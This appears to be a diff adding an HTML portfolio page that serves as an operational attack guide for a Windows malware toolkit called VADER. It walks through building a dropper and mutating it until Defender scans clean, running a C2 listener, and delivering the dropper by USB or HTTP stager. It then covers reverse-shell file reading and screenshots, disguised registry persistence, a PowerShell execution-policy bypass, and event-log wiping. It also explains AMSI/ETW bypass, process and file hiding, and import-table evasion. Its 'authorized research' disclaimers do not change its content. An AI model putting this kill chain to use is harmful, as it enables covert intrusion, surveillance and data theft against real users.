@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>George Wu | VADER Installation &amp; Attack Guide</title>
+<meta name="description" content="Complete installation, build, and attack execution guide for the VADER offensive security toolkit. Clone to kill chain in one page.">
+<meta name="author" content="George Wu">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://rainfantry.github.io/guide.html">
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+:root {
+  --bg: #0a0a0a; --bg2: #111; --bg3: #1a1a1a;
+  --green: #00ff41; --green2: #33cc33; --green3: #00cc33;
+  --amber: #ffb000; --red: #ff4444; --cyan: #00e5ff;
+  --blue: #4488ff; --pink: #ff66aa;
+  --dim: #444; --muted: #888; --text: #ccc; --bright: #eee;
+  --mono: 'Cascadia Code','Consolas','Source Code Pro','Courier New',monospace;
+}
+html { scroll-behavior: smooth; }
+body {
+  font-family: var(--mono);
+  background: var(--bg);
+  color: var(--text);
+  line-height: 1.7;
+  min-height: 100vh;
+}
+body::after {
+  content: '';
+  position: fixed; inset: 0;
+  background: repeating-linear-gradient(0deg, transparent, transparent 3px, rgba(0,255,65,0.008) 3px, rgba(0,255,65,0.008) 4px);
+  pointer-events: none; z-index: 999;
+}
+.container { max-width: 960px; margin: 0 auto; padding: 2rem 1.5rem; }
+nav { border-bottom: 1px solid #1a1a1a; padding: 0.5rem 0; position: sticky; top: 0; z-index: 100; background: var(--bg); }
+nav .inner { max-width: 960px; margin: 0 auto; padding: 0 1.5rem; display: flex; align-items: center; gap: 1rem; flex-wrap: wrap; }
+nav .brand { color: var(--green); font-weight: 700; text-decoration: none; font-size: 0.9rem; letter-spacing: 0.1em; }
+nav a { color: var(--muted); text-decoration: none; font-size: 0.75rem; letter-spacing: 0.06em; transition: color 0.2s; }
+nav a:hover { color: var(--green); }
+nav a.nav-active { color: var(--green); }
+.nav-links { display: flex; gap: 1.2rem; align-items: center; flex: 1; flex-wrap: wrap; }
+.hamburger { display: none; background: none; border: 1px solid var(--dim); color: var(--green); font-size: 1.2rem; padding: 0.2rem 0.6rem; cursor: pointer; border-radius: 3px; }
+@media (max-width: 700px) {
+  .hamburger { display: block; }
+  .nav-links { display: none; flex-direction: column; width: 100%; gap: 0.5rem; }
+  .nav-links.show { display: flex; }
+}
+.hero { padding: 3rem 0 2rem; border-bottom: 1px solid #1a1a1a; margin-bottom: 2rem; }
+.hero h1 { color: var(--green); font-size: 1.6rem; font-weight: 400; letter-spacing: 0.15em; margin-bottom: 0.3rem; }
+.hero .sub { color: var(--muted); font-size: 0.85rem; margin-bottom: 0.8rem; }
+.section { margin-bottom: 2.5rem; }
+.section h2 { color: var(--green); font-size: 1rem; font-weight: 400; letter-spacing: 0.12em; margin-bottom: 1rem; border-bottom: 1px solid #1a1a1a; padding-bottom: 0.4rem; }
+.section h3 { color: var(--amber); font-size: 0.88rem; font-weight: 700; margin: 1.2rem 0 0.5rem; }
+.section p { font-size: 0.78rem; margin-bottom: 0.5rem; }
+table { width: 100%; border-collapse: collapse; font-size: 0.78rem; }
+th { text-align: left; color: var(--green2); font-weight: 400; padding: 0.4rem 0.6rem; border-bottom: 1px solid var(--bg3); }
+td { padding: 0.4rem 0.6rem; border-bottom: 1px solid #111; vertical-align: top; }
+td a { color: var(--cyan); text-decoration: none; }
+td a:hover { color: var(--green); }
+.cmd {
+  background: #0d0d0d;
+  border: 1px solid #222;
+  border-left: 3px solid var(--green);
+  border-radius: 4px;
+  padding: 0.6rem 0.8rem;
+  margin: 0.5rem 0;
+  overflow-x: auto;
+  font-size: 0.72rem;
+  line-height: 1.5;
+  white-space: pre;
+  font-family: var(--mono);
+  color: var(--text);
+}
+.cmd .p { color: var(--green2); user-select: none; }
+.cmd .c { color: var(--dim); font-style: italic; }
+.cmd .o { color: var(--muted); }
+.warn {
+  background: rgba(255,176,0,0.06);
+  border: 1px solid rgba(255,176,0,0.15);
+  border-radius: 4px;
+  padding: 0.5rem 0.8rem;
+  font-size: 0.72rem;
+  color: var(--amber);
+  margin: 0.5rem 0;
+}
+.step-num {
+  display: inline-block;
+  background: rgba(0,255,65,0.1);
+  color: var(--green);
+  font-size: 0.65rem;
+  font-weight: 700;
+  padding: 0.1rem 0.5rem;
+  border-radius: 2px;
+  margin-right: 0.5rem;
+  letter-spacing: 0.08em;
+}
+.repo-card {
+  background: var(--bg2);
+  border: 1px solid var(--bg3);
+  border-radius: 4px;
+  padding: 0.8rem 1rem;
+  margin-bottom: 0.5rem;
+}
+.repo-card .name { color: var(--green); font-weight: 700; font-size: 0.85rem; }
+.repo-card .desc { color: var(--muted); font-size: 0.72rem; margin-top: 0.2rem; }
+.repo-card .files { color: var(--dim); font-size: 0.68rem; margin-top: 0.3rem; }
+.knowledge-block {
+  background: var(--bg2);
+  border: 1px solid var(--bg3);
+  border-left: 3px solid var(--amber);
+  border-radius: 4px;
+  padding: 1rem 1.2rem;
+  margin-bottom: 0.8rem;
+}
+.knowledge-block .title { color: var(--amber); font-weight: 700; font-size: 0.82rem; margin-bottom: 0.4rem; }
+.knowledge-block .body { font-size: 0.75rem; line-height: 1.6; }
+.knowledge-block .body ul { margin: 0.3rem 0 0 1.2rem; }
+.knowledge-block .body li { margin-bottom: 0.2rem; }
+.farewell {
+  border: 1px solid var(--green);
+  border-radius: 4px;
+  padding: 1.5rem;
+  margin: 2rem 0;
+  text-align: center;
+}
+.farewell .title { color: var(--green); font-size: 1.1rem; letter-spacing: 0.15em; margin-bottom: 0.5rem; }
+.farewell .body { color: var(--text); font-size: 0.8rem; line-height: 1.8; }
+footer { border-top: 1px solid #1a1a1a; padding: 2rem 0; text-align: center; color: var(--muted); font-size: 0.8rem; }
+footer a { color: var(--green3); text-decoration: none; }
+footer a:hover { color: var(--green); }
+</style>
+</head>
+<body>
+
+<nav>
+  <div class="inner">
+    <a href="index.html" class="brand">22DIV</a>
+    <button class="hamburger" id="navToggle" aria-label="Toggle menu">&#9776;</button>
+    <div class="nav-links" id="navLinks">
+      <a href="index.html">home</a>
+      <a href="rootkit.html">VADER</a>
+      <a href="sithstalker.html">sith stalker</a>
+      <a href="skywalker.html">skywalker</a>
+      <a href="starkiller.html">starkiller</a>
+      <a href="ghost.html">ghost</a>
+      <a href="dossier.html">dossier</a>
+      <a href="guide.html" class="nav-active">guide</a>
+      <a href="journal.html">journal</a>
+      <a href="books.html">field manual</a>
+    </div>
+  </div>
+</nav>
+
+<div class="container">
+
+<!-- HEADER -->
+<div class="hero">
+  <h1>// INSTALLATION &amp; ATTACK GUIDE</h1>
+  <div class="sub">Clone to kill chain. Everything verified against GitHub and local machine.</div>
+</div>
+
+<!-- ═══════ PREREQUISITES ═══════ -->
+<div class="section">
+  <h2>// PREREQUISITES</h2>
+  <table>
+    <tr><th>Requirement</th><th>Version</th><th>Purpose</th></tr>
+    <tr><td style="color:var(--green);">Windows 11</td><td>Build 26200+</td><td>Target OS (tested on Home edition)</td></tr>
+    <tr><td style="color:var(--green);">Visual Studio</td><td>2024/18 Community</td><td>MSVC cl.exe for C compilation</td></tr>
+    <tr><td style="color:var(--green);">Python</td><td>3.12+</td><td>Build scripts, listeners, ghost encoder</td></tr>
+    <tr><td style="color:var(--green);">Git</td><td>Any</td><td>Clone repos, version control</td></tr>
+    <tr><td style="color:var(--green);">NASM</td><td>2.15+</td><td>Assembly stubs for SithStalker gate engines</td></tr>
+  </table>
+  <div class="warn">AUTHORIZED RESEARCH ONLY. Own hardware. Own network. Responsible disclosure via MSRC.</div>
+</div>
+
+<!-- ═══════ REPOSITORIES ═══════ -->
+<div class="section">
+  <h2>// STEP 1 &mdash; CLONE ALL REPOSITORIES</h2>
+  <p>Six repos. Each handles a different layer of the kill chain.</p>
+
+  <div class="repo-card">
+    <div class="name">vader-rootkit</div>
+    <div class="desc">Core implant framework &mdash; shell, Dark Room, cloak, dropper, injection, persistence, forensics</div>
+    <div class="files">76 source files &bull; cloak/ dark_room/ injection/ shell/ stagers/ forensics/ recon/ deploy.py</div>
+  </div>
+  <div class="repo-card">
+    <div class="name">ghost-encoder</div>
+    <div class="desc">Zero-width Unicode steganographic encoder &mdash; file-level payload invisibility</div>
+    <div class="files">ghost_encode.py &bull; ghost_decode.py &bull; ghost_selftest.py</div>
+  </div>
+  <div class="repo-card">
+    <div class="name">sith-stalker</div>
+    <div class="desc">Indirect syscall engine (Hell's Gate / Halo's Gate) + concealment DLL hooks</div>
+    <div class="files">src/gate.c gate_v2.c &bull; cloak/hide_process.c hide_file.c hide_connection.c hook_engine.c</div>
+  </div>
+  <div class="repo-card">
+    <div class="name">skywalker</div>
+    <div class="desc">Cold standby C2 &mdash; independent binary signatures, beacon mode, DLL search order exploits</div>
+    <div class="files">beacon/sw_beacon_live.c sw_listener.py &bull; disclosure/poc_*.c &bull; deploy.py mutate.py</div>
+  </div>
+  <div class="repo-card">
+    <div class="name">starkiller</div>
+    <div class="desc">Android RAT &mdash; C2 server + Kotlin client + obfuscation pipeline + binder</div>
+    <div class="files">server/starkiller_c2.py &bull; client/app/ (Kotlin) &bull; obfuscate.py binder.py build.py</div>
+  </div>
+  <div class="repo-card">
+    <div class="name">rainfantry.github.io</div>
+    <div class="desc">Portfolio &mdash; all documentation, dossier playbook, build tutorials, this guide</div>
+    <div class="files">index.html rootkit.html ghost.html dossier.html guide.html + study pages</div>
+  </div>
+
+  <div class="cmd"><span class="c"># Clone all repos (private — requires GitHub auth)</span>
+<span class="p">$</span> mkdir 22div && cd 22div
+<span class="p">$</span> gh repo clone rainfantry/vader-rootkit
+<span class="p">$</span> gh repo clone rainfantry/ghost-encoder
+<span class="p">$</span> gh repo clone rainfantry/sith-stalker
+<span class="p">$</span> gh repo clone rainfantry/skywalker
+<span class="p">$</span> gh repo clone rainfantry/starkiller
+<span class="p">$</span> gh repo clone rainfantry/rainfantry.github.io</div>
+</div>
+
+<!-- ═══════ BUILD ═══════ -->
+<div class="section">
+  <h2>// STEP 2 &mdash; BUILD THE DROPPER</h2>
+  <p>vader_dropper.exe is the single-click kill chain. One compile produces everything.</p>
+
+  <h3><span class="step-num">2A</span> Open Developer Command Prompt</h3>
+  <div class="cmd"><span class="c"># Open "Developer Command Prompt for VS" from Start menu</span>
+<span class="c"># OR manually load MSVC environment:</span>
+<span class="p">&gt;</span> "C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvars64.bat"</div>
+
+  <h3><span class="step-num">2B</span> Compile All Binaries</h3>
+  <div class="cmd"><span class="p">$</span> cd vader-rootkit
+<span class="p">$</span> python cloak/build_cloak.py --scan
+
+<span class="o">  VADER CLOAK — Build
+  ===================
+
+  [+] Compiling cloak.dll            105 KB
+  [+] Compiling cloak_loader.exe     143 KB
+  [+] Compiling vader_dropper.exe    268 KB
+
+  [+] cloak.dll:         CLEAN
+  [+] cloak_loader.exe:  CLEAN
+  [+] vader_dropper.exe: CLEAN</span></div>
+
+  <h3><span class="step-num">2C</span> Verify Build Output</h3>
+  <div class="cmd"><span class="p">$</span> ls cloak/bin/
+<span class="o">cloak.dll           105 KB
+cloak_loader.exe    143 KB
+vader_dropper.exe   268 KB</span>
+
+<span class="c"># All three should report CLEAN against Defender.</span>
+<span class="c"># If any flag: run mutate.py to rotate XOR keys and recompile.</span>
+<span class="p">$</span> python mutate.py --rotate-keys</div>
+</div>
+
+<!-- ═══════ ATTACK: SINGLE-CLICK ═══════ -->
+<div class="section">
+  <h2>// STEP 3 &mdash; EXECUTE ATTACK (SINGLE-CLICK METHOD)</h2>
+  <p>Fastest path. One EXE does everything: AMSI bypass, cloak, persistence, C2, screen capture.</p>
+
+  <h3><span class="step-num">3A</span> Start C2 Listener (Attacker Machine)</h3>
+  <div class="cmd"><span class="c"># Terminal 1 — C2 listener</span>
+<span class="p">$</span> cd vader-rootkit
+<span class="p">$</span> python cloak/c2_listen.py 53682
+
+<span class="o">[*] VADER C2 — listening on 0.0.0.0:53682
+[*] Waiting for connection...</span></div>
+
+  <h3><span class="step-num">3B</span> Configure C2 Address</h3>
+  <div class="cmd"><span class="c"># Edit vader_dropper.c line 63-68 — change xC2Addr to your IP</span>
+<span class="c"># OR pass IP as command line argument when running:</span>
+<span class="p">&gt;</span> vader_dropper.exe 192.168.1.100 53682</div>
+  <div class="warn">Default C2 is 192.168.1.100:53682. Change xC2Addr XOR bytes for a compiled-in address, or pass IP:PORT as args.</div>
+
+  <h3><span class="step-num">3C</span> Deploy to Target</h3>
+  <div class="cmd"><span class="c"># USB drop</span>
+<span class="p">$</span> copy cloak\bin\vader_dropper.exe E:\
+
+<span class="c"># OR HTTP stager</span>
+<span class="p">$</span> python stagers/vader_serve.py --payload cloak/bin/vader_dropper.exe --port 8443
+
+<span class="c"># Target downloads and double-clicks. No warnings. No prompts.</span></div>
+
+  <h3><span class="step-num">3D</span> Automatic Kill Chain (Runs on Double-Click)</h3>
+  <div class="cmd"><span class="c"># This happens automatically inside vader_dropper.exe:</span>
+
+<span class="o">1. Sandbox check      — RAM &gt; 2GB, CPU &gt; 1, Sleep timing real
+2. Dynamic imports    — XOR-decode API names, resolve via GetProcAddress
+3. Dark Room          — DR0 on AmsiScanBuffer, DR1 on EtwEventWrite
+4. Cloak deploy       — Decrypt cloak.dll, drop to %TEMP%, load, CBT hook
+5. Persistence        — Self-copy to APPDATA + registry HKCU Run key
+6. C2 connect         — Reverse TCP to your listener, auto-reconnect 5s
+7. Interactive shell  — Full command execution + screenshot capability</span></div>
+
+  <h3><span class="step-num">3E</span> Operate via C2 Shell</h3>
+  <div class="cmd"><span class="c"># Connection appears in your listener:</span>
+<span class="o">[+] Connection from 192.168.1.50:49812
+[+] Hostname: TARGET-PC | Cloak: ACTIVE
+
+C:\Users\target&gt;</span>
+
+<span class="c"># Available commands:</span>
+<span class="p">C:\&gt;</span> screenshot                    <span class="c"># grab desktop (raw BMP over socket)</span>
+<span class="p">C:\&gt;</span> dir C:\Users\target\Desktop   <span class="c"># browse files</span>
+<span class="p">C:\&gt;</span> type secrets.txt              <span class="c"># read files</span>
+<span class="p">C:\&gt;</span> systeminfo                    <span class="c"># system enumeration</span>
+<span class="p">C:\&gt;</span> whoami /priv                  <span class="c"># privilege check</span>
+<span class="p">C:\&gt;</span> cd C:\Users\target\Documents  <span class="c"># navigate</span>
+<span class="p">C:\&gt;</span> exit                          <span class="c"># disconnect (auto-reconnects)</span></div>
+
+  <h3><span class="step-num">3F</span> Verify Persistence (Reboot Test)</h3>
+  <div class="cmd"><span class="c"># From C2 shell — check registry key exists:</span>
+<span class="p">C:\&gt;</span> reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v SecurityHealthSystray
+<span class="o">  SecurityHealthSystray    REG_SZ    C:\Users\...\svchost_update.exe</span>
+
+<span class="c"># Reboot the target machine.</span>
+<span class="c"># Watch your listener — connection re-establishes on login.</span>
+<span class="o">[+] Connection from 192.168.1.50:49920  (reconnected after reboot)</span></div>
+</div>
+
+<!-- ═══════ ATTACK: GHOST METHOD ═══════ -->
+<div class="section">
+  <h2>// STEP 4 &mdash; ALTERNATIVE: GHOST-ENCODED PAYLOAD</h2>
+  <p>For PowerShell-based delivery. Payload is invisible in the file — zero-width Unicode characters.</p>
+
+  <div class="cmd"><span class="c"># Generate ghost-encoded VADER payload</span>
+<span class="p">$</span> cd ghost-encoder
+<span class="p">$</span> python ghost_encode.py --vader --ip 192.168.1.100 --port 53682
+
+<span class="o">[+] Generated VADER payload (persistence x3, screen capture, auto-reconnect)
+[+] Ghost encoded → vader_ghost.ps1
+[+] File appears BLANK in Notepad</span>
+
+<span class="c"># Deliver via HTA (double-click executes in browser)</span>
+<span class="p">$</span> python ghost_encode.py --hta --ip 192.168.1.100
+
+<span class="c"># OR execute directly on target:</span>
+<span class="p">&gt;</span> powershell -ep bypass -File vader_ghost.ps1</div>
+  <div class="warn">Ghost encoding protects the FILE layer (static scan). Dark Room must be active for RUNTIME protection (AMSI bypass). The vader_dropper.exe method includes both automatically.</div>
+</div>
+
+<!-- ═══════ CLEANUP ═══════ -->
+<div class="section">
+  <h2>// STEP 5 &mdash; CLEANUP &amp; MUTATION</h2>
+  <div class="cmd"><span class="c"># Anti-forensics — from C2 shell on target</span>
+<span class="p">C:\&gt;</span> vader_clean.exe
+<span class="o">[*] Phase 1: Wiping persistence artifacts
+[*] Phase 2: Clearing event logs
+[*] Phase 3: Removing dropped files
+[*] Phase 4: Scrubbing prefetch/shimcache
+[*] Phase 5: Self-delete
+[+] Clean.</span>
+
+<span class="c"># Mutate for next engagement — new signatures</span>
+<span class="p">$</span> cd vader-rootkit
+<span class="p">$</span> python mutate.py --rotate-keys
+<span class="p">$</span> python cloak/build_cloak.py --scan
+<span class="o">[+] New XOR keys applied. All binaries recompiled. CLEAN.</span></div>
+</div>
+
+<!-- ═══════ FILE MAP ═══════ -->
+<div class="section">
+  <h2>// FILE MAP &mdash; WHAT LIVES WHERE</h2>
+  <table>
+    <tr><th>File</th><th>Repo</th><th>What It Does</th></tr>
+    <tr><td style="color:var(--red);font-weight:700;">vader_dropper.c</td><td>vader-rootkit/cloak/</td><td>Single-click EXE — AMSI bypass + cloak + persistence + C2 + screencap</td></tr>
+    <tr><td style="color:var(--green);">build_cloak.py</td><td>vader-rootkit/cloak/</td><td>Compiles dropper + cloak DLL + loader, runs Defender scan</td></tr>
+    <tr><td style="color:var(--green);">c2_listen.py</td><td>vader-rootkit/cloak/</td><td>C2 listener — receives dropper connections</td></tr>
+    <tr><td style="color:var(--green);">cloak.c + hide_*.c</td><td>vader-rootkit/cloak/</td><td>Concealment DLL — hooks NtQuery* to hide process/files/connections</td></tr>
+    <tr><td style="color:var(--green);">hook_engine.c</td><td>vader-rootkit/cloak/</td><td>Generic x64 inline hooking primitives (12-byte abs JMP + trampoline)</td></tr>
+    <tr><td style="color:var(--amber);">dark_room_annotated.c</td><td>vader-rootkit/dark_room/</td><td>AMSI/ETW bypass via HWBP — the technique that MSRC won't fix</td></tr>
+    <tr><td style="color:var(--green);">vader_shell.c</td><td>vader-rootkit/shell/</td><td>Standalone reverse shell (without dropper integration)</td></tr>
+    <tr><td style="color:var(--green);">vader_inject.c</td><td>vader-rootkit/injection/</td><td>Process injector — HWBP all threads, CREATE_SUSPENDED mode</td></tr>
+    <tr><td style="color:var(--green);">vader_clean_annotated.c</td><td>vader-rootkit/forensics/</td><td>Anti-forensics — 5-phase wipe + self-delete</td></tr>
+    <tr><td style="color:var(--green);">vader_recon.ps1</td><td>vader-rootkit/recon/</td><td>Defender reconnaissance scanner</td></tr>
+    <tr><td style="color:var(--green);">deploy.py</td><td>vader-rootkit/</td><td>Unified deployment script — compile, scan, test, deploy</td></tr>
+    <tr><td style="color:var(--green);">mutate.py</td><td>vader-rootkit/</td><td>Polymorphic mutation — rotate XOR keys, recompile unique children</td></tr>
+    <tr><td style="color:var(--pink);">ghost_encode.py</td><td>ghost-encoder/</td><td>Zero-width Unicode steganographic encoder + VADER payload generator</td></tr>
+    <tr><td style="color:var(--cyan);">gate_v2.c + gate_stub_v2.asm</td><td>sith-stalker/src/</td><td>Indirect syscall engine — XOR-encrypted hash table + MASM stubs</td></tr>
+    <tr><td style="color:var(--cyan);">cloak/*.c</td><td>sith-stalker/cloak/</td><td>Concealment layer source — BYOVD, DKOM, inline hooks</td></tr>
+    <tr><td style="color:var(--amber);">sw_beacon_live.c</td><td>skywalker/beacon/</td><td>Cold standby C2 agent — independent binary signatures</td></tr>
+    <tr><td style="color:var(--red);">starkiller_c2.py</td><td>starkiller/server/</td><td>Android RAT C2 server + web dashboard</td></tr>
+  </table>
+</div>
+
+<!-- ═══════ FAREWELL KNOWLEDGE ═══════ -->
+<div class="section">
+  <h2>// FAREWELL &mdash; KEY KNOWLEDGE FROM THE BUILD</h2>
+  <p style="margin-bottom:1rem;">Everything learned building this toolkit. The concepts that matter. The traps to avoid.</p>
+
+  <div class="knowledge-block">
+    <div class="title">THE TWO-LAYER PROTECTION MODEL</div>
+    <div class="body">
+      There are two fundamentally different problems: hiding payloads from <b style="color:var(--pink);">static analysis</b> (AV scanning files on disk) and hiding execution from <b style="color:var(--red);">runtime monitoring</b> (AMSI scanning scripts in memory).
+      <ul>
+        <li><b style="color:var(--pink);">Ghost Encoding</b> solves the FILE layer — payloads become invisible zero-width Unicode. No signatures to match. Files appear blank.</li>
+        <li><b style="color:var(--red);">Dark Room</b> solves the RUNTIME layer — hardware breakpoints on AmsiScanBuffer and EtwEventWrite. CPU debug registers, not memory patches.</li>
+        <li>You need BOTH. Ghost without Dark Room = payload decodes then AMSI catches it. Dark Room without Ghost = Defender catches the file before it runs.</li>
+        <li>vader_dropper.exe combines both automatically.</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="knowledge-block">
+    <div class="title">WHY HARDWARE BREAKPOINTS CAN'T BE FIXED</div>
+    <div class="body">
+      MSRC acknowledged this as VULN-195458 and won't fix it. Hardware breakpoints use CPU debug registers (DR0-DR3) — they're a CPU feature, not a Windows feature. Defender can't detect them because:
+      <ul>
+        <li>No memory is modified. No bytes patched. No VirtualProtect calls.</li>
+        <li>Debug registers are per-thread and only readable via GetThreadContext (which requires THREAD_GET_CONTEXT access to the target thread).</li>
+        <li>The Vectored Exception Handler is a legitimate Windows API. Thousands of applications use VEH for crash handling.</li>
+        <li>The only "fix" would be for Windows to prevent user-mode code from setting its OWN debug registers — which would break every debugger.</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="knowledge-block">
+    <div class="title">GHOST ENCODING IS NOT OBFUSCATION</div>
+    <div class="body">
+      Obfuscation transforms code to make it harder to understand. Ghost encoding doesn't transform anything — it represents data using characters that have zero visual width. The distinction matters:
+      <ul>
+        <li>Obfuscation can be reversed by analysis tools. Ghost encoding can't be "unobfuscated" because it was never obfuscated — the data is literally invisible.</li>
+        <li>AV signature scanners look for byte patterns. Ghost-encoded payloads contain zero known malicious byte sequences — every byte is a Unicode control character.</li>
+        <li>The payload only becomes "real" when decoded at runtime — at which point Dark Room has already blinded AMSI.</li>
+        <li>Ghost encoding is the FILE layer. Not a substitute for runtime protection.</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="knowledge-block">
+    <div class="title">XOR STRING ENCRYPTION — DEFENSE IN DEPTH</div>
+    <div class="body">
+      Every suspicious string in the dropper (API names, registry paths, filenames, C2 address) is XOR-encrypted in the binary:
+      <ul>
+        <li>Key 0xB5 for API function names (WSASocket, SetWindowsHookExA, AmsiScanBuffer)</li>
+        <li>Key 0xBE for operational strings (cmd.exe, C2 IP, registry path, persistence filename)</li>
+        <li>Strings are decoded to stack buffers at runtime, used once, then zeroed with memset()</li>
+        <li>A hex dump of the EXE reveals no suspicious strings — no "cmd.exe", no "HKCU\Software\...", no C2 IP</li>
+        <li>mutate.py rotates these keys and recompiles — every build has unique XOR encoding</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="knowledge-block">
+    <div class="title">THE CONCEALMENT ARCHITECTURE</div>
+    <div class="body">
+      cloak.dll uses inline hooks on three NT functions to hide from the OS itself:
+      <ul>
+        <li><b>NtQuerySystemInformation</b> — unlinks our process from the SYSTEM_PROCESS_INFORMATION linked list. Task Manager, tasklist, Process Explorer — all blind.</li>
+        <li><b>NtQueryDirectoryFile</b> — unlinks our files from FILE_BOTH_DIR_INFORMATION. dir, Explorer, any file listing — blind.</li>
+        <li><b>NtDeviceIoControlFile</b> — filters MIB_TCPROW entries matching our C2 port. netstat, TCPView — blind.</li>
+        <li>SetWindowsHookEx(WH_CBT) spreads cloak.dll system-wide automatically — one command and every GUI process is hooked.</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="knowledge-block">
+    <div class="title">DYNAMIC IMPORTS — STAYING OUT OF THE IAT</div>
+    <div class="body">
+      The Import Address Table (IAT) is the first thing a static analyzer checks. If your EXE imports WSASocket + SetWindowsHookEx + CreateProcess + AddVectoredExceptionHandler — that's a red flag profile.
+      <ul>
+        <li>vader_dropper.exe only shows GetProcAddress, LoadLibraryA, GetModuleHandleA, VirtualAlloc in its IAT — the same as any Windows application.</li>
+        <li>All suspicious APIs are resolved at runtime: XOR-decode the function name → LoadLibrary the DLL → GetProcAddress the function → store in a function pointer.</li>
+        <li>Registry functions (RegOpenKeyEx, RegSetValueEx) and GDI functions (BitBlt, GetDIBits) are left as direct imports — they're not suspicious. Thousands of legitimate apps use them.</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="knowledge-block">
+    <div class="title">WHAT DEFENDER ACTUALLY DETECTS (HONEST TRUTH)</div>
+    <div class="body">
+      <ul>
+        <li><b style="color:var(--green);">Static scan</b> — CLEAN. All 26+ binaries pass MpCmdRun. XOR encoding + dynamic imports + no known signatures = invisible to signature-based detection.</li>
+        <li><b style="color:var(--green);">AMSI runtime</b> — BYPASSED. Dark Room HWBP. MSRC confirmed won't fix.</li>
+        <li><b style="color:var(--green);">ETW telemetry</b> — BYPASSED. Same HWBP technique on EtwEventWrite.</li>
+        <li><b style="color:var(--amber);">Behavioral analysis</b> — MINIMAL risk. All API calls are legitimate Windows functions used by thousands of apps. No process hollowing, no APC injection, no NtMapViewOfSection abuse.</li>
+        <li><b style="color:var(--red);">Enterprise EDR</b> — NOT tested. CrowdStrike, Carbon Black, SentinelOne use kernel-level telemetry (ETW-Ti, minifilters, callback registrations) that user-mode bypasses don't reach. The cloak hides from user-mode queries but kernel drivers can still see the process.</li>
+        <li><b style="color:var(--amber);">Network detection</b> — Raw TCP egress on configurable port. No encryption, no domain fronting, no DNS tunneling. A network IDS watching for unusual outbound connections WILL see it. Future work: TLS wrapping.</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="knowledge-block">
+    <div class="title">ARCHITECTURE DECISIONS THAT MATTERED</div>
+    <div class="body">
+      <ul>
+        <li><b>C over Python for implants.</b> No runtime dependency. No interpreter to detect. 268 KB standalone EXE vs Python requiring a 50MB runtime. C compiles to native code that blends with legitimate Windows binaries.</li>
+        <li><b>WinMain over main.</b> /SUBSYSTEM:WINDOWS means no console window flashes when the dropper runs. Completely silent execution.</li>
+        <li><b>Embedded DLL over separate file.</b> cloak.dll is XOR-encrypted inside vader_dropper.exe. One file to deploy, not two. Decrypted at runtime and written to %TEMP% — then deleted on exit.</li>
+        <li><b>Registry Run over Scheduled Tasks.</b> HKCU Run key doesn't require admin. Scheduled tasks via COM are complex and create more forensic artifacts. Simple wins.</li>
+        <li><b>Raw BMP over JPEG for screenshots.</b> No GDI+ dependency needed. Larger data (5.9 MB vs 200 KB) but simpler code and zero additional DLLs. The C2 listener can convert to JPEG.</li>
+        <li><b>Auto-reconnect with infinite retries.</b> MAX_RETRIES = 0 means the dropper never gives up. Listener goes down, comes back up — dropper reconnects. Persistence through network disruptions.</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="farewell">
+    <div class="title">// END OF TRANSMISSION</div>
+    <div class="body">
+      Six repositories. 76+ source files. 26 compiled binaries. Zero detections.<br>
+      One MSRC disclosure. One kill chain. One single-click dropper.<br><br>
+      Every layer exists for a reason. Every design decision has a "why."<br>
+      The dossier is the playbook. This guide is the manual. The code is the proof.<br><br>
+      <span style="color:var(--green);">From steganography to rootkit &mdash; the full chain, documented and operational.</span><br><br>
+      <span style="color:var(--dim);">22DIV / VADER / george wu</span>
+    </div>
+  </div>
+
+</div>
+
+<!-- ═══════ QUICK LINKS ═══════ -->
+<div class="section">
+  <h2>// QUICK LINKS</h2>
+  <table>
+    <tr><th>Page</th><th>What</th></tr>
+    <tr><td><a href="index.html">Landing Page</a></td><td>Operations order + 8-phase learning path</td></tr>
+    <tr><td><a href="dossier.html">Dossier / Playbook</a></td><td>Operational kill chain + build-from-scratch tutorial + 7-day reading order</td></tr>
+    <tr><td><a href="rootkit.html">VADER Deep Dive</a></td><td>Full technical breakdown of the rootkit framework</td></tr>
+    <tr><td><a href="ghost.html">Ghost Encoder</a></td><td>Zero-width steganography showcase + detection profile</td></tr>
+    <tr><td><a href="sithstalker.html">Sith Stalker</a></td><td>Indirect syscall engine documentation</td></tr>
+    <tr><td><a href="skywalker.html">Skywalker</a></td><td>Cold standby C2 + DLL search order exploits</td></tr>
+    <tr><td><a href="starkiller.html">StarKiller</a></td><td>Android RAT documentation</td></tr>
+    <tr><td><a href="csec.html">Kill Chain Studies</a></td><td>CSEC cybersecurity coursework + Cyber Kill Chain mapping</td></tr>
+  </table>
+</div>
+
+</div>
+
+<footer>
+  <div>george wu / 22DIV &mdash; VADER</div>
+  <div style="margin-top:0.5rem; font-size:0.75rem;">
+    <a href="https://github.com/rainfantry/vader-rootkit" style="color:#33cc33;">vader-rootkit</a> &middot;
+    <a href="https://github.com/rainfantry/ghost-encoder" style="color:#ff66aa;">ghost-encoder</a> &middot;
+    <a href="https://github.com/rainfantry/sith-stalker" style="color:#00e5ff;">sith-stalker</a> &middot;
+    <a href="https://github.com/rainfantry/skywalker" style="color:#ffb000;">skywalker</a> &middot;
+    <a href="https://github.com/rainfantry/starkiller" style="color:#ff4444;">starkiller</a>
+  </div>
+  <div style="margin-top:0.4rem; opacity:0.4;">Authorized research on own hardware only.</div>
+</footer>
+
+<script>
+document.getElementById('navToggle')?.addEventListener('click', () => {
+  document.getElementById('navLinks').classList.toggle('show');
+});
+</script>
+</body>
+</html>
